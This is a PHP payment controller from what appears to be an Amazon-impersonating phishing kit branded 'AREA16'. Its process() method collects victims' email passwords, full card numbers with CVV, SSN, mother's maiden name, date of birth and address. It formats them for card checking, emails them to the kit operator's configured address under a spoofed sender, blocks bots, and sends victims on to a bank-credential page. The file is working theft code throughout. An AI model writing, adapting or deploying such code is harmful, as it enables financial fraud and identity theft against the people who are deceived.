<?php 
defined("ACCESS") or die('Konz');

class Payment 
{
	private $_LICENSE = FCPATH . "AREA16/system/private/license.ini";
	private $_CONFIG = FCPATH. "AREA16/system/private/setting.json";

	public function __construct()
	{
		$this->pc = new Pc();
		$_ini_file = parse_ini_file($this->_LICENSE);
		$this->license = new license($_ini_file);

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 6)) {
			
			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Access Page Without Session|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{
		echo view('payment/index');
	}

	public function process()
	{
		if (isset($_POST)) {
			$address = $_SESSION['address'];
			$cityP = $_SESSION['cityp'];
			$state = $_SESSION['region'];
			$zipCode = $_SESSION['zipcode'];
			$dob = $_SESSION['dob'];
			$ssn = $_SESSION['ssn'];
			$motherName = $_SESSION['mmn'];
			$phone = $_SESSION['phone'];
			$cardName = trim($_SESSION['namecard']);
			$cardNumber2 = $_POST['ccn'];
			$cardNumber2 = str_replace(" ", "", $cardNumber2);
			$cardCcv2 = $_POST['cvv'];
			$cardExpM = $_POST['expmonth'];
			$cardExpY = $_POST['expyear'];
			$cardExp = substr($cardExpY, 2);
			$bin = look_bin($cardNumber2);
			$email = trim($_SESSION['emailLogin']);
			$password = trim($_SESSION['password_email']);
			$password2 = trim($_SESSION['password_email2']);

			$message = 
"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: アマゾン - エリア16チームによって作成されました❤️ ::</span></strong>

<strong>:: Email Account ::</strong>
			
# Email address  : {$email}
# Password       : {$password}
# Password 2     : {$password2}
# Check format   : {$email}|{$password}
# Check format 2 : {$email}|{$password2}

<strong>:: Double Credit or Debit Card ::</strong>
			
# BIN : {$bin}
# Cardholder name : {$cardName}
# Card number 	  : {$cardNumber2}
# Expiration 	  : {$cardExpM}/{$cardExpY}
# Cvv/Cvv2	  : {$cardCcv2}
# Check format 	  : {$cardNumber2}|{$cardExpM}|{$cardExp}|{$cardCcv2}

<strong>:: Personal Information ::</strong>
			
# Address  : {$address}
# City 	   : {$cityP}
# State    : {$state}
# Zip code : {$zipCode}
# Phone    : {$phone}
# MMN 	   : {$motherName}
# SSN 	   : {$ssn}
# DOB	   : {$dob}

<strong>:: Visitor Details ::</strong>

# Time &amp; Date  : "._date()."  
# Device       : {$this->pc->platform}
# Browser      : {$this->pc->browser}
# Country      : {$_SESSION['country']}
# State        : {$_SESSION['regionName']}
# City         : {$_SESSION['city']}
# Ip address   : {$this->pc->ip_address}
# User agent   : {$this->pc->agent}

</pre>
</fieldset>
</pre>";

			$subject = "{$bin} :: [ {$_SESSION['country']} - {$this->pc->ip_address} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: AREA16 <admin@area16.sg>";

			@mail(_config('result'), $subject, $message, $headers);

			write(FCPATH . 'AREA16/system/stats/log_cc.txt', 'a', "{$this->pc->ip_address}\r\n");
			$this->license->create_logs("Human|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Submit Credit card|"._time()."", "CREDITCARD");

			if (_config('get_bank') == 'on') {
				$_SESSION['access'] = 7;
				redirect(base_url() . 'bank/#');
			} else {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'done');
			}
		}
	}
}